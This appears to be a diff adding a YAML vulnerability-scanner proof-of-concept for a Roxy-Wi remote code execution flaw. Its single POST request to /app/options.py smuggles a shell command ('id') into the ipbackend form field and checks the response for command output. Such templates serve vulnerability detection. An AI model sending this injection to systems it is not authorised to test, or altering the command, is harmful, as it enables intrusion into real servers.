@@ -1,0 +1,19 @@
+id: poc-yaml-roxy-wi-remote-code-execution
+info:
+  name: Roxy-Wi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Roxy-Wi
+  osprey-id: vb_2022_0099
+requests:
+- method: POST
+  path: /app/options.py
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1
+  expression: 'contains(body, "groups=") && contains(body, "gid=")
+
+    '
+variables: {}
+transport: http
